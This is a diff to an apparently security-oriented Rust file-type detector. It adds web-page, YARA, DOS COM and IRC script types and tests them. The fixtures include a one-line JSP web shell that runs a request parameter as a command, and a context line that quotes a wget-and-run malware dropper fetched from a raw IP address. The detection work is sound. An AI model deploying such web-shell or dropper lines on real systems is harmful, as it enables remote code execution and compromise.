@@ -173,7 +173,8 @@ fn file_group(ft: FileType) -> &'static str {
         | FileType::Wasm
         | FileType::Dex
         | FileType::StaticLib
-        | FileType::Lnk => "binary",
+        | FileType::Lnk
+        | FileType::DosCom => "binary",
         // Interpreted scripting languages (cleave's `scripts` for-group).
         FileType::Shell
         | FileType::Batch
@@ -186,7 +187,12 @@ fn file_group(ft: FileType) -> &'static str {
         | FileType::Perl
         | FileType::Lua
         | FileType::PowerShell
-        | FileType::AppleScript => "script",
+        | FileType::AppleScript
+        | FileType::Jsp
+        | FileType::Asp
+        | FileType::Cfml
+        | FileType::Mirc
+        | FileType::IrcII => "script",
         // Compiled / typed source languages (cleave's `source` for-group).
         FileType::TypeScript
         | FileType::Go
@@ -234,7 +240,10 @@ fn file_group(ft: FileType) -> &'static str {
         | FileType::Pbxproj
         | FileType::Cmake
         | FileType::Makefile
-        | FileType::Dockerfile => "config",
+        | FileType::Dockerfile
+        // A detection ruleset, not prose. A `.yar` renamed `.txt` is
+        // config→text; it is not the same kind of file as a note.
+        | FileType::Yara => "config",
         FileType::Jar
         | FileType::Zip
         | FileType::Tar
@@ -280,9 +289,12 @@ fn file_group(ft: FileType) -> &'static str {
         | FileType::SquashFs
         | FileType::GentooBinpkg
         | FileType::Asar => "archive",
-        FileType::Rtf | FileType::OleDoc | FileType::Ooxml | FileType::Pdf | FileType::Odf => {
-            "document"
-        }
+        FileType::Rtf
+        | FileType::OleDoc
+        | FileType::Ooxml
+        | FileType::Pdf
+        | FileType::Odf
+        | FileType::PostScript => "document",
         // Installer packages share the OLE2/CFBF wire format with OleDoc but
         // are not documents — treat them as archive-class for mismatch
         // transitions (e.g. an MSI renamed `.doc` is archive→document).
@@ -301,7 +313,7 @@ fn file_group(ft: FileType) -> &'static str {
         // Fonts are their own class, not images: a font renamed to `.png`
         // is a format transition worth reporting, not a benign refinement.
         FileType::Font => "font",
-        FileType::Html | FileType::Markdown | FileType::Text => "text",
+        FileType::Html | FileType::Markdown | FileType::Text | FileType::Tex => "text",
         FileType::Pickle | FileType::PgpSignature | FileType::Data | FileType::Unknown => "data",
     }
 }
@@ -662,6 +674,25 @@ pub enum FileType {
     Pdf,
     /// HTML document (.html, .htm)
     Html,
+    /// JavaServer Pages (`.jsp`, `.jspx`). The page directive is unique to JSP.
+    Jsp,
+    /// Classic ASP and ASP.NET (`.asp`, `.aspx`, and the related suffixes).
+    Asp,
+    /// ColdFusion Markup Language (`.cfm`, `.cfc`, `.cfml`).
+    Cfml,
+    /// TeX or LaTeX source (`.tex`, `.sty`, `.ltx`, `.dtx`). `.cls` is shared
+    /// with Visual Basic, so a class file is TeX only when its body says so.
+    Tex,
+    /// YARA rule source (`.yar`, `.yara`).
+    Yara,
+    /// PostScript or EPS (`.ps`, `.eps`).
+    PostScript,
+    /// DOS COM executable. No header of its own; `INT 21h` (`CD 21`) is the syscall.
+    DosCom,
+    /// mIRC script (`.mrc`).
+    Mirc,
+    /// ircII or EPIC script. The `^on` / `^alias` hook syntax is the mark.
+    IrcII,
     /// Markdown document (.md, .markdown)
     Markdown,
     /// Makefile / GNU Make build file
@@ -759,6 +790,7 @@ impl FileType {
                 | Self::Beam
                 | Self::Wasm
                 | Self::Dex
+                | Self::DosCom
         )
     }
 
@@ -916,6 +948,15 @@ impl FileType {
             Self::Cmake => "cmake",
             Self::Svg => "svg",
             Self::Html => "html",
+            Self::Jsp => "jsp",
+            Self::Asp => "asp",
+            Self::Cfml => "cfml",
+            Self::Tex => "tex",
+            Self::Yara => "yara",
+            Self::PostScript => "postscript",
+            Self::DosCom => "dos_com",
+            Self::Mirc => "mirc",
+            Self::IrcII => "ircii",
             Self::Markdown => "markdown",
             Self::PgpSignature => "pgp_signature",
             Self::Text => "text",
@@ -1067,6 +1108,15 @@ impl FileType {
             "cmake" => Self::Cmake,
             "svg" => Self::Svg,
             "html" => Self::Html,
+            "jsp" => Self::Jsp,
+            "asp" => Self::Asp,
+            "cfml" => Self::Cfml,
+            "tex" => Self::Tex,
+            "yara" => Self::Yara,
+            "postscript" => Self::PostScript,
+            "dos_com" => Self::DosCom,
+            "mirc" => Self::Mirc,
+            "ircii" => Self::IrcII,
             "markdown" => Self::Markdown,
             "pgp_signature" => Self::PgpSignature,
             "text" => Self::Text,
@@ -1329,6 +1379,22 @@ fn allows_heuristic_extension_override(file_type: FileType) -> bool {
 /// that mentions a keyword stays text, but a file whose body is clearly a
 /// language (`Php_Backdoor.txt`) should be that language. Other extensions
 /// that map to `Text` (OCaml `.ml`, CSS, SQL) stay on the extension.
+/// Extensions that are a filename habit rather than a type claim. A mark may
+/// replace them. A real `.java` or `.py` may not.
+fn mark_replaces(file_type: FileType) -> bool {
+    matches!(
+        file_type,
+        FileType::Text
+            | FileType::Html
+            | FileType::ObjectiveC
+            | FileType::Lua
+            | FileType::Clojure
+            | FileType::JavaScript
+            | FileType::Python
+            | FileType::Vbs
+    )
+}
+
 fn prose_extension_may_be_source(path: &Path) -> bool {
     let Some(ext) = path.extension().and_then(|e| e.to_str()) else {
         return false;
@@ -1432,6 +1498,38 @@ pub fn detect(path: &Path, data: &[u8]) -> Option<Detection> {
     if let Some((file_type, source)) = magic::detect_from_content(path, data) {
         let ext_ft = ext::detect_from_path(path);
 
+        // A `.jsp` / `.asp` / `.cfm` page often opens with an HTML prologue.
+        // That prologue is magic for HTML, but the extension is what the
+        // server executes. Prefer it; the prologue is not a different type.
+        if file_type == FileType::Html {
+            if let Some(ext_type) = ext_ft {
+                if matches!(ext_type, FileType::Jsp | FileType::Asp | FileType::Cfml) {
+                    return Some(Detection {
+                        file_type: ext_type,
+                        source: DetectionSource::Extension,
+                        ext_match: ExtensionMatch::Consistent,
+                    });
+                }
+            }
+            // A saved page can open with a doctype and still be the server
+            // page a few lines later. The mark replaces that HTML prologue
+            // the same way it replaces a `.txt` name.
+            if let Some(marked) = heuristics::unmistakable(data) {
+                if matches!(marked, FileType::Jsp | FileType::Asp | FileType::Cfml) {
+                    let ext_match = match ext_ft {
+                        Some(e) if e != marked => ExtensionMatch::Different(e),
+                        None if has_named_extension(path) => ExtensionMatch::Unknown,
+                        Some(_) | None => ExtensionMatch::Consistent,
+                    };
+                    return Some(Detection {
+                        file_type: marked,
+                        source: DetectionSource::Heuristic,
+                        ext_match,
+                    });
+                }
+            }
+        }
+
         // Shebang-juke override: when the shebang claims a different scripting
         // language than the file's extension implies, and both languages are
         // plausible (script ↔ script), prefer the extension. The shebang is
@@ -1483,6 +1581,24 @@ pub fn detect(path: &Path, data: &[u8]) -> Option<Detection> {
     let ext_ft = ext::detect_from_path(path);
     let heuristic_may_override_ext = ext_ft.is_none_or(allows_heuristic_extension_override);
 
+    // One unmistakable mark beats the language scorer. It only replaces a
+    // weak or absent extension (`.txt`, `.m`, `.lua`, a page typed HTML
+    // because of a prologue). A `.java` or `.py` name stays what it says.
+    if let Some(marked) = heuristics::unmistakable(data) {
+        if ext_ft.is_none_or(|ext| ext == marked || mark_replaces(ext)) {
+            let ext_match = match ext_ft {
+                Some(e) if e != marked => ExtensionMatch::Different(e),
+                None if has_named_extension(path) => ExtensionMatch::Unknown,
+                Some(_) | None => ExtensionMatch::Consistent,
+            };
+            return Some(Detection {
+                file_type: marked,
+                source: DetectionSource::Heuristic,
+                ext_match,
+            });
+        }
+    }
+
     // Stage 3: Content heuristics for unknown extensions and extension-claimed
     // containers/polyglots. Ordinary source extensions stay authoritative here:
     // language keyword scoring is too weak to override `.go`, `.js`, `.swift`,
@@ -1510,8 +1626,13 @@ pub fn detect(path: &Path, data: &[u8]) -> Option<Detection> {
     // from the suffix. UTF-16 source is excluded inside `binary_not_source`.
     if let Some(ext) = ext_ft.filter(|ft| ft.is_source_code()) {
         if heuristics::binary_not_source(data) {
+            let file_type = if heuristics::looks_like_dos_com(data) {
+                FileType::DosCom
+            } else {
+                FileType::Data
+            };
             return Some(Detection {
-                file_type: FileType::Data,
+                file_type,
                 source: DetectionSource::Heuristic,
                 ext_match: ExtensionMatch::Different(ext),
             });
@@ -1982,6 +2103,77 @@ cd /tmp || /var/tmp; rm avtech.arm7; wget http://193.243.147.115/avtech.arm7; ch
     }
 
     #[test]
+    fn jsp_page_directive_is_jsp() {
+        let bom = b"\xef\xbb\xbf<%@page pageEncoding=\"utf-8\"%>\n<%@page import=\"java.io.*\"%>\n<%!\nString pw = \"x\";\n%>\n";
+        assert_detect("date.jsp.txt", bom, FileType::Jsp);
+        let spaced =
+            b"<%@ page language=\"java\" contentType=\"text/html\"%>\n<% out.println(1); %>\n";
+        assert_detect("page.jsp", spaced, FileType::Jsp);
+        // An HTML prologue does not change what a `.jsp` is.
+        assert_detect("page.jsp", b"<html><body>hi</body></html>", FileType::Jsp);
+        // A Java source file that quotes a directive stays Java.
+        assert_detect(
+            "App.java",
+            b"<%@page pageEncoding=\"utf-8\"%>\nclass App {}\n",
+            FileType::Java,
+        );
+        // A saved browser copy opens with a doctype. The page directive a few
+        // lines later is still the type.
+        let saved = b"<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\">\n\
+<HTML><HEAD><TITLE>shell</TITLE></HEAD>\n\
+<%@ page contentType=\"text/html; charset=GBK\" %>\n\
+<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>\n";
+        assert_detect("shell.jsp.txt", saved, FileType::Jsp);
+        assert_detect(
+            "base64.jspx.txt",
+            b"<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"2.0\">\n\
+<jsp:scriptlet>String s;</jsp:scriptlet>\n</jsp:root>\n",
+            FileType::Jsp,
+        );
+        assert_detect(
+            "App.java",
+            b"<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\">\nclass App {}\n",
+            FileType::Java,
+        );
+        assert_detect(
+            "page.html",
+            b"<!DOCTYPE html>\n<html><body>hi</body></html>\n",
+            FileType::Html,
+        );
+    }
+
+    #[test]
+    fn asp_directive_is_asp() {
+        let classic = b"<%@ Language=VBScript %>\n<%\nFunction Foo()\nEnd Function\n%>\n";
+        assert_detect("aspydrv.asp.txt", classic, FileType::Asp);
+        let aspx = b"<%@ Page Language=\"C#\" %>\n<script runat=\"server\">\n</script>\n";
+        assert_detect("shell.aspx", aspx, FileType::Asp);
+        assert_detect("renamed.txt", aspx, FileType::Asp);
+    }
+
+    #[test]
+    fn coldfusion_tex_yara_postscript_and_irc_scripts() {
+        assert_detect("p.cfm", b"<cfset x = 1>\n", FileType::Cfml);
+        assert_detect("p.txt", b"<cfoutput>#x#</cfoutput>\n", FileType::Cfml);
+        assert_detect("a.tex", b"hello\n", FileType::Tex);
+        assert_detect("notes.txt", b"\\documentclass{article}\n", FileType::Tex);
+        // `.cls` is also Visual Basic. The body decides.
+        assert_detect("article.cls", b"\\ProvidesClass{article}\n", FileType::Tex);
+        let vb_cls = detect(Path::new("Module.cls"), b"VERSION 1.0 CLASS\n");
+        assert_ne!(vb_cls.map(|d| d.file_type), Some(FileType::Tex));
+        let yara = b"rule Demo {\nstrings:\n$a = \"x\"\ncondition:\ntrue\n}\n";
+        assert_detect("r.yar", yara, FileType::Yara);
+        assert_detect("rules.txt", yara, FileType::Yara);
+        assert_detect("doc.ps", b"%!PS-Adobe-3.0\n", FileType::PostScript);
+        assert_detect("bare.ps", b"not a header\n", FileType::PostScript);
+        assert_detect("bot.mrc", b"alias x echo hi\n", FileType::Mirc);
+        assert_detect("shell.m", b"on *:TEXT:*:echo hi\n", FileType::Mirc);
+        assert_detect("shell.lua", b"ON 1:JOIN:*:{\n}\n", FileType::Mirc);
+        assert_detect("hooks.ircii", b"alias x echo hi\n", FileType::IrcII);
+        assert_detect("rc.txt", b"^on ^join \"*\" {\n}\n", FileType::IrcII);
+    }
+
+    #[test]
     fn prose_txt_stays_text() {
         let note = b"This is a note about the meeting. We should let the team decide next week.\n";
         assert_detect("notes.txt", note, FileType::Text);
@@ -2032,8 +2224,10 @@ Coordinate with the Applet Maintainer before sweeping changes.\n";
         }
         com[11] = 0xCD;
         com[12] = 0x21;
-        assert_detect("Burger.m", &com, FileType::Data);
-        assert_detect("Trivial.45.t", &com, FileType::Data);
+        assert_detect("Burger.m", &com, FileType::DosCom);
+        assert_detect("Trivial.45.t", &com, FileType::DosCom);
+        assert_detect("prog.com", &com, FileType::DosCom);
+        assert_detect("prog.com", b"MZ\x90\x00", FileType::Pe);
     }
 
     #[test]
@@ -3250,6 +3444,15 @@ function wpcf7_special_mail_tag( $output, $name, $html ) {
             FileType::Nib,
             FileType::Svg,
             FileType::Html,
+            FileType::Jsp,
+            FileType::Asp,
+            FileType::Cfml,
+            FileType::Tex,
+            FileType::Yara,
+            FileType::PostScript,
+            FileType::DosCom,
+            FileType::Mirc,
+            FileType::IrcII,
             FileType::Markdown,
             FileType::Text,
             FileType::Data,
